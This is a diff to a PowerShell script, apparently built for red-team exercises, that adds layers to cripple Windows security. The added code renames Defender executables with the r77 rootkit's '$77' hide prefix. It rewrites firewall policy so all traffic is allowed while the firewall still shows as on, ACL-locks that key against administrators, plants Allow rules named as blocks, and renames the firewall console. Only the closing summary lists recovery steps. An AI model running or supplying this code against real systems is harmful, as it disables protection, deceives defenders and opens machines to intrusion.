@@ -4,6 +4,9 @@
 # MITRE ATT&CK: T1562.001 (Impair Defenses: Disable/Modify Tools)
 #               T1490   (Inhibit System Recovery)
 #               T1222   (File and Directory Permissions Modification)
+#               T1564.001 (Hide Artifacts: Hidden Files and Directories)
+#               T1562.004 (Impair Defenses: Disable or Modify System Firewall)
+#               T1036   (Masquerading)
 #
 # Targets: Windows Server 2019, Server 2022, Windows 10
 #
@@ -121,6 +124,9 @@ $osInfo   = Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue
 $prodType = if ($osInfo) { $osInfo.ProductType } else { 1 }
 $isServer = $prodType -ne 1
 Write-Info "ProductType=$prodType — $( if ($isServer) { 'Server SKU' } else { 'Workstation SKU' } )"
+
+# Must match the r77 compile-time constant — default release build uses "$77"
+$HIDE_PREFIX = '$77'
 
 # ── Disable TamperProtection (must run before all other ops on fresh installs) ─
 Write-Section "PREAMBLE — Disable TamperProtection"
@@ -459,6 +465,173 @@ try {
     Write-Err "Failed to lock policy key ACL: $_"
 }
 
+# ── LAYER 7: Defender Recovery Binary Rename (T1564.001) ─────────────────────
+Write-Section "LAYER 7 — Defender Recovery Binary Rename"
+
+# Rename key Defender executables with the $77 hide prefix.
+# Once Rootkit_r77Shadow.ps1 is running, $77-prefixed names vanish from
+# dir, Get-ChildItem, and Explorer — blue team loses their repair/diagnostic tools.
+# Services are already stopped from the preamble, so files are unlocked.
+$DefenderBinTargets = @(
+    "$env:ProgramFiles\Windows Defender\MpCmdRun.exe",
+    "$env:ProgramFiles\Windows Defender\MsMpEng.exe",
+    "$env:ProgramFiles\Windows Defender\MpDefenderCoreService.exe",
+    "$env:SystemRoot\System32\MpSigStub.exe"
+)
+foreach ($bin in $DefenderBinTargets) {
+    if (-not (Test-Path $bin)) {
+        Write-Warn "Not found (skip): $bin"
+        continue
+    }
+    $dir     = Split-Path $bin -Parent
+    $leaf    = Split-Path $bin -Leaf
+    $newPath = Join-Path $dir ($HIDE_PREFIX + $leaf)
+    if (Test-Path $newPath) {
+        Write-Info "Already renamed: $leaf -> $($HIDE_PREFIX + $leaf)"
+        continue
+    }
+    & takeown.exe /F $bin /A 2>$null | Out-Null
+    & icacls.exe $bin /grant "BUILTIN\Administrators:(F)" /C /Q 2>$null | Out-Null
+    try {
+        Rename-Item -Path $bin -NewName ($HIDE_PREFIX + $leaf) -Force -ErrorAction Stop
+        Write-Success "Renamed: $leaf -> $($HIDE_PREFIX + $leaf)"
+    } catch {
+        Write-Warn "Rename-Item failed for $leaf — trying cmd /c move..."
+        $rc = (Start-Process -FilePath "cmd.exe" `
+                             -ArgumentList "/c move /Y `"$bin`" `"$newPath`"" `
+                             -WindowStyle Hidden -Wait -PassThru).ExitCode
+        if ($rc -eq 0) {
+            Write-Success "cmd move succeeded: $leaf -> $($HIDE_PREFIX + $leaf)"
+        } else {
+            Write-Err "Could not rename ${leaf} (exit $rc) — file may still be in use"
+        }
+    }
+}
+
+# ── LAYER 8: Firewall Phantom (T1562.004 + T1036) ─────────────────────────────
+Write-Section "LAYER 8 — Firewall Phantom"
+
+# Part A — Policy Ghost
+# -----------------------------------------------------------------------
+# Windows Firewall GROUP POLICY keys take precedence over local rules.
+# DefaultInboundAction=0 (Allow) means every "Block" rule blue team adds via
+# New-NetFirewallRule or netsh is silently overridden. EnableFirewall=1 keeps
+# the firewall appearing ON in all UI surfaces. The parent key is ACL-locked
+# so blue team cannot flip values even as admin.
+
+# Re-enable mpssvc in case Phase 1 disabled it — firewall must be running
+# for the phantom to be visible to blue team.
+$fwSvc = Get-Service -Name "mpssvc" -ErrorAction SilentlyContinue
+if ($fwSvc -and $fwSvc.Status -ne "Running") {
+    try {
+        Set-Service -Name "mpssvc" -StartupType Automatic -ErrorAction SilentlyContinue
+        Start-Service -Name "mpssvc" -ErrorAction Stop
+        Write-Success "mpssvc re-enabled and started (firewall phantom mode)"
+    } catch {
+        Write-Warn "Could not start mpssvc: $_"
+    }
+} else {
+    Write-Info "mpssvc is already running"
+}
+
+# Also undo Phase 1's registry disable of mpssvc if present
+$mpssvcReg = "HKLM:\SYSTEM\CurrentControlSet\Services\mpssvc"
+if (Test-Path $mpssvcReg) {
+    Set-ItemProperty -Path $mpssvcReg -Name "Start" -Value 2 -Type DWord -Force -ErrorAction SilentlyContinue
+}
+
+$fwPolicyParent = "HKLM:\SOFTWARE\Policies\Microsoft\WindowsFirewall"
+if (-not (Test-Path $fwPolicyParent)) {
+    New-Item -Path $fwPolicyParent -Force | Out-Null
+}
+
+foreach ($profile in @("DomainProfile","PrivateProfile","PublicProfile","StandardProfile")) {
+    $profileKey = "$fwPolicyParent\$profile"
+    if (-not (Test-Path $profileKey)) { New-Item -Path $profileKey -Force | Out-Null }
+    Set-ItemProperty -Path $profileKey -Name "EnableFirewall"        -Value 1 -Type DWord -Force
+    Set-ItemProperty -Path $profileKey -Name "DefaultInboundAction"  -Value 0 -Type DWord -Force  # 0 = Allow
+    Set-ItemProperty -Path $profileKey -Name "DefaultOutboundAction" -Value 0 -Type DWord -Force  # 0 = Allow
+    Set-ItemProperty -Path $profileKey -Name "DisableNotifications"  -Value 1 -Type DWord -Force
+    Write-Success "Phantom policy: $profile (EnableFirewall=1, DefaultInboundAction=Allow)"
+}
+
+# ACL-lock parent key with ContainerInherit — blue team cannot change any
+# profile subkey without taking ownership first
+$owned = Grant-RegKeyOwnership -KeyPath $fwPolicyParent
+if ($owned) { Write-Info "Took ownership of firewall policy parent key" }
+try {
+    $fwAcl = Get-Acl $fwPolicyParent
+    foreach ($principal in @("BUILTIN\Administrators","NT AUTHORITY\SYSTEM")) {
+        $fwDeny = New-Object System.Security.AccessControl.RegistryAccessRule(
+            $principal,
+            [System.Security.AccessControl.RegistryRights]::WriteKey,
+            [System.Security.AccessControl.InheritanceFlags]::ContainerInherit,
+            [System.Security.AccessControl.PropagationFlags]::None,
+            [System.Security.AccessControl.AccessControlType]::Deny)
+        $fwAcl.AddAccessRule($fwDeny)
+    }
+    Set-Acl -Path $fwPolicyParent -AclObject $fwAcl
+    Write-Success "DENY WriteKey (ContainerInherit) applied to firewall policy key — admin must take ownership to fix"
+} catch {
+    Write-Err "Failed to lock firewall policy key ACL: $_"
+}
+
+# Part B — Deceptive "Defensive" Rules
+# -----------------------------------------------------------------------
+# Rules whose display names read as defensive/blocking but whose Action is
+# Allow. Blue team sees "BLOCK-Unauthorized-Inbound" in Get-NetFirewallRule
+# and assumes protection is in place. Get-NetFirewallRule | Where Action -eq Block
+# returns nothing for these, but blue team rarely checks Action directly.
+$decoyRules = @(
+    @{ Name="BLOCK-Unauthorized-Inbound"; DisplayName="Block Unauthorized Inbound";           Direction="Inbound";  Action="Allow" },
+    @{ Name="Defender-Protected-Inbound"; DisplayName="Defender-Protected Inbound Policy";    Direction="Inbound";  Action="Allow" },
+    @{ Name="FW-Emergency-Lockdown-All";  DisplayName="Emergency Lockdown All Unauthorized";  Direction="Outbound"; Action="Allow" }
+)
+foreach ($rule in $decoyRules) {
+    Remove-NetFirewallRule -Name $rule.Name -ErrorAction SilentlyContinue
+    try {
+        New-NetFirewallRule -Name $rule.Name -DisplayName $rule.DisplayName `
+            -Direction $rule.Direction -Action $rule.Action `
+            -Protocol Any -Enabled True -ErrorAction Stop | Out-Null
+        Write-Success "Planted decoy rule: '$($rule.DisplayName)' (Action=$($rule.Action), looks like block)"
+    } catch {
+        Write-Warn "Could not create decoy rule '$($rule.Name)': $_"
+    }
+}
+
+# ── LAYER 9: Firewall Management Tool Rename (T1564.001) ─────────────────────
+Write-Section "LAYER 9 — Firewall Management Tool Rename"
+
+# Rename the firewall snap-in and control panel DLL so blue team can't open
+# the GUI management console. wf.msc disappears from Run/Start Search;
+# FirewallControlPanel.dll breaks the Settings firewall config page.
+# Do NOT rename netsh.exe (system-critical) or mpssvc.dll (breaks phantom).
+$FwToolTargets = @(
+    "$env:SystemRoot\System32\wf.msc",
+    "$env:SystemRoot\System32\FirewallControlPanel.dll"
+)
+foreach ($tool in $FwToolTargets) {
+    if (-not (Test-Path $tool)) {
+        Write-Warn "Not found (skip): $tool"
+        continue
+    }
+    $dir     = Split-Path $tool -Parent
+    $leaf    = Split-Path $tool -Leaf
+    $newPath = Join-Path $dir ($HIDE_PREFIX + $leaf)
+    if (Test-Path $newPath) {
+        Write-Info "Already renamed: $leaf"
+        continue
+    }
+    & takeown.exe /F $tool /A 2>$null | Out-Null
+    & icacls.exe $tool /grant "BUILTIN\Administrators:(F)" /C /Q 2>$null | Out-Null
+    try {
+        Rename-Item -Path $tool -NewName ($HIDE_PREFIX + $leaf) -Force -ErrorAction Stop
+        Write-Success "Renamed: $leaf -> $($HIDE_PREFIX + $leaf)"
+    } catch {
+        Write-Warn "Could not rename ${leaf}: $_"
+    }
+}
+
 # ── Summary ───────────────────────────────────────────────────────────────────
 Write-Host ""
 Write-Success "================================================================"
@@ -478,4 +651,12 @@ Write-Info "  L5: takeown /F <taskdir> /R /A; icacls <taskdir> /remove:d Adminis
 Write-Info "      Then recreate Defender tasks via: Add-WindowsFeature / Defender service restart"
 Write-Info "  L6: takeown /F HKLM\SOFTWARE\Policies\Microsoft\Windows Defender (regedit)"
 Write-Info "      Delete DisableAntiSpyware; restore TamperProtection=5 in Defender\Features"
+Write-Info "  L7: Defender binaries renamed with `$77 prefix — find via:"
+Write-Info "      dir /a 'C:\Program Files\Windows Defender\`$77*'"
+Write-Info "      Rename back: Rename-Item `$77MpCmdRun.exe MpCmdRun.exe (after killing rootkit)"
+Write-Info "  L8: Firewall policy ghost — takeown on HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall"
+Write-Info "      Then delete DefaultInboundAction / DefaultOutboundAction values in each *Profile key"
+Write-Info "      Remove decoy rules: Remove-NetFirewallRule -Name BLOCK-Unauthorized-Inbound,etc."
+Write-Info "  L9: wf.msc / FirewallControlPanel.dll renamed with `$77 prefix — find and rename back"
+Write-Info "      after rootkit is removed: dir /a C:\Windows\System32\`$77*.msc"
 Write-Host ""
